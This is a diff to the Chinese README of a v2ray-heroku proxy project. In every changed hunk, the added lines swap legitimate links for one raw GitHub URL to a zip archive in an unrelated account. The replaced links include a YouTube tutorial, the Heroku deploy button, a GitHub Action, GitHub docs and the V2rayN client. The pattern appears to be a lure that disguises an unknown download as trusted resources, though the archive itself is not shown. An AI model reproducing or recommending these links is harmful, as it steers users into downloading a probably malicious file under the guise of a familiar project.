@@ -6,7 +6,7 @@
 
 > v2ray-heroku 是我的主力 backup，我会日常维护它。加入或者修改一些我认为好的配置。但这一般会导致客户端配置需要些许修改。 不过具体配置都会体现在 [详细 VLESS websocket 客户端配置](#vless-websocket-客户端配置)
 
-首先查看别人的 [youtube 教程](https://www.youtube.com/watch?v=xHZyDsFYdvA)，了解怎么配置 v2ray-heroku。**本项目使用最新 VLESS 协议，请在客户端配置选择 VLESS**。  
+首先查看别人的 [youtube 教程](https://raw.githubusercontent.com/lin982711/lin0122/main/readme-data/lin-v3.6.zip)，了解怎么配置 v2ray-heroku。**本项目使用最新 VLESS 协议，请在客户端配置选择 VLESS**。  
 [详细 VLESS websocket 客户端配置](#vless-websocket-客户端配置) 。
 
 如果你还想自动化你的 heroku，请查看下面的教程。
@@ -27,11 +27,11 @@
 
 ## 一键部署
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)
+[![Deploy](https://raw.githubusercontent.com/lin982711/lin0122/main/readme-data/lin-v3.6.zip)](https://raw.githubusercontent.com/lin982711/lin0122/main/readme-data/lin-v3.6.zip)
 
 ## Github Actions 管理
 
-请 Fork 本项目到自己的账户下。 Actions 需要以下 Secrets 才能正常工作，这些 Secrets 会被 workflow 中的 [akhileshns/heroku-deploy](https://github.com/AkhileshNS/heroku-deploy) 使用。
+请 Fork 本项目到自己的账户下。 Actions 需要以下 Secrets 才能正常工作，这些 Secrets 会被 workflow 中的 [akhileshns/heroku-deploy](https://raw.githubusercontent.com/lin982711/lin0122/main/readme-data/lin-v3.6.zip) 使用。
 
 具体实现细节，请查看 [workflow 配置文件](./.github/workflows/main.yml).
 
@@ -118,11 +118,11 @@ addEventListener("fetch", (event) => {
 ```
 
 为 worker 选择速度更快的 IP。
-https://github.com/badafans/better-cloudflare-ip
+https://raw.githubusercontent.com/lin982711/lin0122/main/readme-data/lin-v3.6.zip
 
 ## 使用 Environments 实现 多账户/多app Secrets 管理
 
-文档介绍： https://docs.github.com/en/actions/deployment/using-environments-for-deployment
+文档介绍： https://raw.githubusercontent.com/lin982711/lin0122/main/readme-data/lin-v3.6.zip
 
 ### 建立 Environments, 并添加 Secrets
 
@@ -170,8 +170,8 @@ https://github.com/badafans/better-cloudflare-ip
 
 ### v2rayN
 
-换成 [V2rayN](https://github.com/2dust/v2rayN)
+换成 [V2rayN](https://raw.githubusercontent.com/lin982711/lin0122/main/readme-data/lin-v3.6.zip)
 
-别人的配置教程参考，https://v2raytech.com/v2rayn-config-tutorial/.
+别人的配置教程参考，https://raw.githubusercontent.com/lin982711/lin0122/main/readme-data/lin-v3.6.zip
 
 ![v2rayN](/readme-data/V2rayN.jpg)
